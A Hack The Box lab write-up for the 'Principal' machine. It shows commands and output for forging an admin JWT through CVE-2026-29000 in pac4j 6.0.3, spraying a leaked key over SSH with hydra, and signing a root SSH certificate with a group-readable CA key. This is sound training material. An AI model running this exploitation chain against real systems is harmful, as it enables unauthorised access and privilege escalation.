# Target
| Category          | Details                                                                                      |
|-------------------|----------------------------------------------------------------------------------------------|
| 📝 **Name**       | [Principal](https://app.hackthebox.com/machines/Principal)                                   |  
| 🏷 **Type**       | HTB Machine                                                                                  |
| 🖥 **OS**         | Linux                                                                                        |
| 🎯 **Difficulty** | Medium                                                                                       |
| 📁 **Tags**       | pac4j 6.0.3, [CVE-2026-29000](https://nvd.nist.gov/vuln/detail/CVE-2026-29000), SSH CA abuse |

### User flag

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/HTB Principal]
└─$ nmap -sS -sC -sV -p- $TARGET                
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-16 08:24 +0200
Nmap scan report for 10.129.20.97
Host is up (0.028s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b0:a0:ca:46:bc:c2:cd:7e:10:05:05:2a:b8:c9:48:91 (ECDSA)
|_  256 e8:a4:9d:bf:c1:b6:2a:37:93:40:d0:78:00:f5:5f:d9 (ED25519)
8080/tcp open  http-proxy Jetty
| http-title: Principal Internal Platform - Login
|_Requested resource was /login
|_http-server-header: Jetty
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Tue, 16 Jun 2026 06:25:17 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: application/json
|     {"timestamp":"2026-06-16T06:25:17.977+00:00","status":404,"error":"Not Found","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}
|   GetRequest: 
|     HTTP/1.1 302 Found
|     Date: Tue, 16 Jun 2026 06:25:17 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Content-Language: en
|     Location: /login
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Tue, 16 Jun 2026 06:25:17 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Allow: GET,HEAD,OPTIONS
|     Accept-Patch: 
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Date: Tue, 16 Jun 2026 06:25:17 GMT
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 349
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
|     <title>Error 505 Unknown Version</title>
|     </head>
|     <body>
|     <h2>HTTP ERROR 505 Unknown Version</h2>
|     <table>
|     <tr><th>URI:</th><td>/badMessage</td></tr>
|     <tr><th>STATUS:</th><td>505</td></tr>
|     <tr><th>MESSAGE:</th><td>Unknown Version</td></tr>
|     </table>
|     </body>
|     </html>
|   Socks5: 
|     HTTP/1.1 400 Bad Request
|     Date: Tue, 16 Jun 2026 06:25:18 GMT
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 382
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
|     <title>Error 400 Illegal character CNTL=0x5</title>
|     </head>
|     <body>
|     <h2>HTTP ERROR 400 Illegal character CNTL=0x5</h2>
|     <table>
|     <tr><th>URI:</th><td>/badMessage</td></tr>
|     <tr><th>STATUS:</th><td>400</td></tr>
|     <tr><th>MESSAGE:</th><td>Illegal character CNTL=0x5</td></tr>
|     </table>
|     </body>
|_    </html>
|_http-open-proxy: Proxy might be redirecting requests
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.98%I=7%D=6/16%Time=6A30EC4D%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,A4,"HTTP/1\.1\x20302\x20Found\r\nDate:\x20Tue,\x2016\x20Jun\x2
SF:02026\x2006:25:17\x20GMT\r\nServer:\x20Jetty\r\nX-Powered-By:\x20pac4j-
SF:jwt/6\.0\.3\r\nContent-Language:\x20en\r\nLocation:\x20/login\r\nConten
SF:t-Length:\x200\r\n\r\n")%r(HTTPOptions,A2,"HTTP/1\.1\x20200\x20OK\r\nDa
SF:te:\x20Tue,\x2016\x20Jun\x202026\x2006:25:17\x20GMT\r\nServer:\x20Jetty
SF:\r\nX-Powered-By:\x20pac4j-jwt/6\.0\.3\r\nAllow:\x20GET,HEAD,OPTIONS\r\
SF:nAccept-Patch:\x20\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,220,
SF:"HTTP/1\.1\x20505\x20HTTP\x20Version\x20Not\x20Supported\r\nDate:\x20Tu
SF:e,\x2016\x20Jun\x202026\x2006:25:17\x20GMT\r\nCache-Control:\x20must-re
SF:validate,no-cache,no-store\r\nContent-Type:\x20text/html;charset=iso-88
SF:59-1\r\nContent-Length:\x20349\r\n\r\n<html>\n<head>\n<meta\x20http-equ
SF:iv=\"Content-Type\"\x20content=\"text/html;charset=ISO-8859-1\"/>\n<tit
SF:le>Error\x20505\x20Unknown\x20Version</title>\n</head>\n<body>\n<h2>HTT
SF:P\x20ERROR\x20505\x20Unknown\x20Version</h2>\n<table>\n<tr><th>URI:</th
SF:><td>/badMessage</td></tr>\n<tr><th>STATUS:</th><td>505</td></tr>\n<tr>
SF:<th>MESSAGE:</th><td>Unknown\x20Version</td></tr>\n</table>\n\n</body>\
SF:n</html>\n")%r(FourOhFourRequest,13B,"HTTP/1\.1\x20404\x20Not\x20Found\
SF:r\nDate:\x20Tue,\x2016\x20Jun\x202026\x2006:25:17\x20GMT\r\nServer:\x20
SF:Jetty\r\nX-Powered-By:\x20pac4j-jwt/6\.0\.3\r\nCache-Control:\x20must-r
SF:evalidate,no-cache,no-store\r\nContent-Type:\x20application/json\r\n\r\
SF:n{\"timestamp\":\"2026-06-16T06:25:17\.977\+00:00\",\"status\":404,\"er
SF:ror\":\"Not\x20Found\",\"path\":\"/nice%20ports%2C/Tri%6Eity\.txt%2ebak
SF:\"}")%r(Socks5,232,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nDate:\x20Tue,
SF:\x2016\x20Jun\x202026\x2006:25:18\x20GMT\r\nCache-Control:\x20must-reva
SF:lidate,no-cache,no-store\r\nContent-Type:\x20text/html;charset=iso-8859
SF:-1\r\nContent-Length:\x20382\r\n\r\n<html>\n<head>\n<meta\x20http-equiv
SF:=\"Content-Type\"\x20content=\"text/html;charset=ISO-8859-1\"/>\n<title
SF:>Error\x20400\x20Illegal\x20character\x20CNTL=0x5</title>\n</head>\n<bo
SF:dy>\n<h2>HTTP\x20ERROR\x20400\x20Illegal\x20character\x20CNTL=0x5</h2>\
SF:n<table>\n<tr><th>URI:</th><td>/badMessage</td></tr>\n<tr><th>STATUS:</
SF:th><td>400</td></tr>\n<tr><th>MESSAGE:</th><td>Illegal\x20character\x20
SF:CNTL=0x5</td></tr>\n</table>\n\n</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.32 seconds
```

#### Discover web application is using pac4j 6.0.3
```
┌──(magicrc㉿perun)-[~/attack/HTB Principal]
└─$ curl -I http://$TARGET:8080
HTTP/1.1 302 Found
Date: Tue, 16 Jun 2026 06:28:04 GMT
Server: Jetty
X-Powered-By: pac4j-jwt/6.0.3
Content-Language: en
Location: /login
Content-Length: 0
```

This version is vulnerable to [CVE-2026-29000](https://nvd.nist.gov/vuln/detail/CVE-2026-29000), however to exploit it we need to locate JWKS endpoint.

#### Enumerate web application
```
┌──(magicrc㉿perun)-[~/attack/HTB Principal]
└─$ feroxbuster --url http://$TARGET:8080 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt 
<SNIP>
200      GET      707l     1287w    12691c http://10.129.20.97:8080/static/css/style.css
200      GET        4l       22w      272c http://10.129.20.97:8080/static/img/favicon.svg
200      GET      308l      939w    10949c http://10.129.20.97:8080/static/js/app.js
501      GET        1l       10w      110c http://10.129.20.97:8080/reset-password
200      GET      112l      373w     6152c http://10.129.20.97:8080/login
<SNIP>
```

#### Access `/static/js/app.js`
```
┌──(magicrc㉿perun)-[~/attack/HTB Principal]
└─$ curl http://$TARGET:8080/static/js/app.js
/**
 * Principal Internal Platform - Client Application
 * Version: 1.2.0
 *
 * Authentication flow:
 * 1. User submits credentials to /api/auth/login
 * 2. Server returns encrypted JWT (JWE) token
 * 3. Token is stored and sent as Bearer token for subsequent requests
 *
 * Token handling:
 * - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
 * - Public key available at /api/auth/jwks for token verification
 * - Inner JWT is signed with RS256
 *
 * JWT claims schema:
 *   sub   - username
 *   role  - one of: ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
 *   iss   - "principal-platform"
 *   iat   - issued at (epoch)
 *   exp   - expiration (epoch)
 */

const API_BASE = '';
const JWKS_ENDPOINT = '/api/auth/jwks';
const AUTH_ENDPOINT = '/api/auth/login';
const DASHBOARD_ENDPOINT = '/api/dashboard';
const USERS_ENDPOINT = '/api/users';
const SETTINGS_ENDPOINT = '/api/settings';
<SNIP>
```
We were able to discover JWKS endpoint (amount other endpoints) together with JWE encryption algorithm. 

#### Exploit [CVE-2026-29000](https://nvd.nist.gov/vuln/detail/CVE-2026-29000) to generate JWT
```
┌──(magicrc㉿perun)-[~/attack/HTB Principal]
└─$ git clone -q https://github.com/Strikoder-Premium/CVE-2026-29000-pac4j-jwt.git CVE-2026-29000 && \
python3 ./CVE-2026-29000/CVE-2026-29000.py --url http://$TARGET:8080 --jwks /api/auth/jwks --user admin --role ROLE_ADMIN --enc A128GCM
<SNIP>

[+] Forged JWE token:

eyJhbGciOiJSU0EtT0FFUC0yNTYiLCJlbmMiOiJBMTI4R0NNIiwiY3R5IjoiSldUIiwia2lkIjoiZW5jLWtleS0xIn0.Qm0p4tsamQZiDInfJuMtRCaNH3_o4GNA03AFNJ-DYE99xFla5ZjHNWeF1b7UnbkyCkp3U7XeF9CZS5HB2gIF5p1vk9zp0YAdKJDbs-1kcpT6T-CbJ9vYgf6Yi1A7kVw50E-aATFdooPZ2dFCXChhsCJF1WzAFyPbBLKttPLDRmqdwkWpVAW1EBCzQqpNtOrPpid6h1-SxIxpfqEC57Q5dRZrNKyFdQIJJVcs97VJbba-CgH9hlF0parAIeRqAjjI1owPuUtBi-fx0VY1EkUl5aApl9ol_9jXqaY3vXOKcZ4A9CIOKS6zNVOLpYSW2955uF5K0btCH8WGRUkYHMv8_Q.ZO2M7HGREQKuVpzi.pMbmX2Ws9KZ0BAbBsDnJFN87I2EYqXzzsDgez95haRViLd4mzRBQWnU16t787dGJxY1W9TmQ2WqzyeolAZd1PRISqUJVrV58iULiJvM2D-w5Z__GaCVi3EyPAh7DYKrAge6OHB47_3UAvBLjfVhpA3JIZWAoQ1OQMF14YDPuMVXbBL71mHkaYMYMsmp-EaFZjbD2FEDN7uimwbYe6sE2GEHm-lMH.H60b5_KY-e46cb8KcyVXUg
```

#### Store JWT in env var
```
┌──(magicrc㉿perun)-[~/attack/HTB Principal]
└─$ export JWT=eyJhbGciOiJSU0EtT0FFUC0yNTYiLCJlbmMiOiJBMTI4R0NNIiwiY3R5IjoiSldUIiwia2lkIjoiZW5jLWtleS0xIn0.Qm0p4tsamQZiDInfJuMtRCaNH3_o4GNA03AFNJ-DYE99xFla5ZjHNWeF1b7UnbkyCkp3U7XeF9CZS5HB2gIF5p1vk9zp0YAdKJDbs-1kcpT6T-CbJ9vYgf6Yi1A7kVw50E-aATFdooPZ2dFCXChhsCJF1WzAFyPbBLKttPLDRmqdwkWpVAW1EBCzQqpNtOrPpid6h1-SxIxpfqEC57Q5dRZrNKyFdQIJJVcs97VJbba-CgH9hlF0parAIeRqAjjI1owPuUtBi-fx0VY1EkUl5aApl9ol_9jXqaY3vXOKcZ4A9CIOKS6zNVOLpYSW2955uF5K0btCH8WGRUkYHMv8_Q.ZO2M7HGREQKuVpzi.pMbmX2Ws9KZ0BAbBsDnJFN87I2EYqXzzsDgez95haRViLd4mzRBQWnU16t787dGJxY1W9TmQ2WqzyeolAZd1PRISqUJVrV58iULiJvM2D-w5Z__GaCVi3EyPAh7DYKrAge6OHB47_3UAvBLjfVhpA3JIZWAoQ1OQMF14YDPuMVXbBL71mHkaYMYMsmp-EaFZjbD2FEDN7uimwbYe6sE2GEHm-lMH.H60b5_KY-e46cb8KcyVXUg
```

#### Confirm usable JWT forged
```
┌──(magicrc㉿perun)-[~/attack/HTB Principal]
└─$ curl -s http://$TARGET:8080/api/settings -H "Authorization: Bearer $JWT" | jq
{
  "security": {
    "authFramework": "pac4j-jwt",
    "authFrameworkVersion": "6.0.3",
    "jwtAlgorithm": "RS256",
    "jweAlgorithm": "RSA-OAEP-256",
    "jweEncryption": "A128GCM",
    "encryptionKey": "D3pl0y_$$H_Now42!",
    "tokenExpiry": "3600s",
    "sessionManagement": "stateless"
  },
  "integrations": [
    {
      "status": "connected",
      "lastSync": "2025-12-28T12:00:00Z",
      "name": "GitLab CI/CD"
    },
    {
      "status": "connected",
      "lastSync": "2025-12-28T14:00:00Z",
      "name": "Vault"
    },
    {
      "status": "connected",
      "lastSync": "2025-12-28T14:30:00Z",
      "name": "Prometheus"
    }
  ],
  "infrastructure": {
    "notes": "SSH certificate auth configured for automation - see /opt/principal/ssh/ for CA config.",
    "database": "H2 (embedded)",
    "sshCertAuth": "enabled",
    "sshCaPath": "/opt/principal/ssh/"
  },
  "system": {
    "javaVersion": "21.0.10",
    "serverType": "Jetty 12.x (Embedded)",
    "environment": "production",
    "version": "1.2.0",
    "applicationName": "Principal Internal Platform"
  }
}
```
While successfully accessing `/api/settings` we have found plaintext encryption key. We could try to spray it on list of users. 

#### Obtain list of users using `/api/users`
```
┌──(magicrc㉿perun)-[~/attack/HTB Principal]
└─$ curl -s http://$TARGET:8080/api/users -H "Authorization: Bearer $JWT" | jq -r .users[].username > users.txt && cat users.txt
admin
svc-deploy
jthompson
amorales
bwright
kkumar
mwilson
lzhang
```

#### Use `hydra` to spray password over SSH
```
┌──(magicrc㉿perun)-[~/attack/HTB Principal]
└─$ hydra -I -L users.txt -p 'D3pl0y_$$H_Now42!' ssh://$TARGET
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-16 13:32:01
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:8/p:1), ~1 try per task
[DATA] attacking ssh://10.129.20.97:22/
[22][ssh] host: 10.129.20.97   login: svc-deploy   password: D3pl0y_$$H_Now42!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-16 13:32:07
```
We were able to discover credentials `svc-deploy:D3pl0y_$$H_Now42!`.

#### Access target over SSH using `svc-deploy:D3pl0y_$$H_Now42!`
```
┌──(magicrc㉿perun)-[~/attack/HTB Principal]
└─$ ssh svc-deploy@$TARGET
<SNIP>
svc-deploy@principal:~$ id
uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
```

#### Capture user flag
```
svc-deploy@principal:~$ cat /home/svc-deploy/user.txt 
11eb902821bee5eb9be10591ec49736e
```

### Root flag

#### Identify SSH CA trust with readable private key in `deployers` group
```
svc-deploy@principal:~$ cat /etc/ssh/sshd_config.d/60-principal.conf
# Principal machine SSH configuration
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin prohibit-password
TrustedUserCAKeys /opt/principal/ssh/ca.pub
svc-deploy@principal:~$ ls -l /opt/principal/ssh/ca.pub
-rw-r--r-- 1 root root 742 Mar  5 21:05 /opt/principal/ssh/ca.pub
svc-deploy@principal:~$ ls -la /opt/principal/ssh/
total 20
drwxr-x--- 2 root deployers 4096 Mar 11 04:22 .
drwxr-xr-x 5 root root      4096 Mar 11 04:22 ..
-rw-r----- 1 root deployers  288 Mar  5 21:05 README.txt
-rw-r----- 1 root deployers 3381 Mar  5 21:05 ca
-rw-r--r-- 1 root root       742 Mar  5 21:05 ca.pub
```

#### Forge SSH certificate for `root` principal and authenticate
```
svc-deploy@principal:~$ ssh-keygen -t ed25519 -f ~/key -N '' -C '$RANDOM@$RANDOM.net' && \
ssh-keygen -s /opt/principal/ssh/ca -I 'key' -n root -V +1h ~/key.pub && \
ssh -i ~/key root@localhost
Generating public/private ed25519 key pair.
Your identification has been saved in /home/svc-deploy/key
Your public key has been saved in /home/svc-deploy/key.pub
The key fingerprint is:
SHA256:fKon3HThXBsmsYfrkwKMTyKYo6vye718Ct2uMzCRWE8 $RANDOM@$RANDOM.net
The key's randomart image is:
+--[ED25519 256]--+
|                 |
|    . E   .      |
|   o +     +     |
|  . o ..  = =    |
| o   +  So.B o   |
|+ . =.+..o= .    |
|.. ..O.+oo .     |
|o   .oBo= +      |
|=ooo  *X.. .     |
+----[SHA256]-----+
Signed user key /home/svc-deploy/key-cert.pub: id "key" serial 0 for root valid from 2026-06-16T12:18:00 to 2026-06-16T13:19:35
<SNIP>
root@principal:~# id
uid=0(root) gid=0(root) groups=0(root)
```

#### Capture root flag
```
root@principal:~# cat /root/root.txt 
27a7a0a6a8c5724d1fe315c82df1c2fd
```
